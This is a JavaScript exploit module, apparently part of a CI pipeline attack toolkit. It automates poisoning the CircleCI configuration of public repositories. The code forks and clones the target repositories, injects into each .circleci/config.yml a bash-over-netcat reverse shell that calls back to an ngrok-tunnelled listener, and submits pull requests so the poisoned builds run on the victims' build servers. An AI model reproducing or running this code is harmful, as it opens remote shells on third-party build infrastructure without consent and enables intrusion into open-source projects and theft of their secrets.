const log = console.log,
      chalk = require('chalk'),
      green = chalk.green,
      cyan = chalk.cyan,
      ngrok = require('ngrok'),
      github = require(__dirname + '/../../../lib/gh'),
      files = require(__dirname + '/../../../lib/files'),
      repos = require(__dirname + '/../../../lib/repos'),
      exp = require(__dirname + '/../../../lib/exp'),
      circle = require(__dirname + '/../../../modules/circle'),
      server = require(__dirname + '/../../../lib/server'),
      ng = require(__dirname + '/../../../lib/ng'),
      targets = require(__dirname + '/../../../lib/targets'),
      repodir = __dirname + '/../../../../repos';

module.exports = {

  // This particular run function returns an array of netcat listeners
  run: (callback) => {
    github.githubAuth((err, token, authed_user) => {
      if (err) {
        switch (err.code) {
          case 401:
            console.log(chalk.red('Couldn\'t log you in. Please try again.'));
            break;
          case 422:
            console.log(chalk.red('You already have an access token.'));
            break;
        }
        log(token);
        return callback();
      }
      if (token) {
        const type = "forked";
        var ng_token;

        ng.ngrokAuth((err, ngtoken) => {
          if (err) {
            log(chalk.red(`ERROR with ngrok authentication. ${err}`));
            return callback();
          }
          ng_token = ngtoken;

          //Fork All repos in targets
          repos.forkAll(token, authed_user, () => {

            // Clone all repos that have been forked
            repos.cloneAllRepos(type, authed_user, () => {

              // CREATE CIRCLE-CI SPECIFIC LIST HERE TO USE FROM HERE ON OUT
              targets.getForkedTargetType('circle', authed_user, (raw_targets, circle_targets) => {

                // Start a netcat listener for each cloned repo
                server.startNetcatTempListener((nc, duplex, nc_port) => {

                  // Start an Ngrok instance for listening
                  log(green("Starting ngrok Services..."));
                  server.startNgrokConnect(nc_port, ng_token, (err, hostname, ng_port, ng_server, ng_url) => {

                    if (err) {
                      log(err);
                      return callback();
                    }
                    else {  
                      // Load the .circleci/config.yml file into the repos
                      circle.loadCircleConfigAll(module.exports.name(), authed_user, circle_targets, () => {
                        const append_promises = [];

                        // iterate through list of files, find circle configs and append to the file
                        for (let t in circle_targets) {
                          append_promises.push(new Promise((resolve, reject) => {
                            circle.appendCircleConfig(`${repodir}/${circle_targets[t]}/.circleci/config.yml`, module.exports.injectionString(ng_port, hostname));
                            resolve();
                          }).catch(err => {
                            reject();
                            log(err);
                          }));
                        }

                        // Cash in the promises from above
                        Promise.all(append_promises)
                          .then(c => {
                            log(chalk.green("Making pull requests..."));
                            repos.pullRequestAll(token, type, authed_user, raw_targets, () => {
                              let cbcount = 0;
                              log(chalk.green("Wating for recon callbacks. Grab a coffee, this may take a bit."));
                              duplex.pipe(process.stdout);
                              nc.on('data', (info, msg) => {
                                if (msg.toString('utf8').includes("ciderdone")) {
                                  cbcount++;
                                  if (cbcount >= circle_targets.length) {
                                    log(chalk.green("Recon Session Complete"))
                                    duplex.unpipe(process.stdout);
                                    nc.close();
                                    ngrok.disconnect(ng_url);
                                    return callback();
                                  }
                                }
                              });
                            });
                          }).catch(e => {
                            if(e) {
                              log(e);
                            }
                          });
                      });
                    }
                  });
                });
              });
            });
          });
        });
      }
    });
  },

  name: () => {
    return "circle-ci/recon_basic";
  },

  type: () => {
    return "circle";
  },

  info: (cb) => {
    log(cyan("---\nINFO\n---\n"));
    log((`This exploit takes advantage of open circle-CI repositories to 
create run some basic recon against the build server. This includes.\n`));

    log(cyan("ORDER OF EXECUTION\n------------------\n"));
    log(("1) Fork all targets"));
    log(("2) Clone all forked targets locally"));
    log(("3) Start single shell handler"));
    log(("4) Load and poison the .circleci/config.yml file of the cloned repos"));
    log(("5) Push commited changes, and submit a pull request"));
    log(("6) Listen for incoming messages. Close shell once executed."));
    return cb();
    // Print information about the exploit
  },

  injectionString: (port, host) => {
    return `\n          environment:\n            NGPORT: ${port}\n\
            NGHOSTNAME: ${host}\n\
          command: |\n\
            set +e
            mknod /tmp/backpipe p\n\
            /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &\n\
            while true; do sleep 60; echo "Keepalive"; done`;
  },

  options: () => {
    log(green("\n-------\nOPTIONS\n-------\n"));
    log(green("NO OPTIONS. This is the 'easy' exploit. No need to set IPs or ports."));
  }
}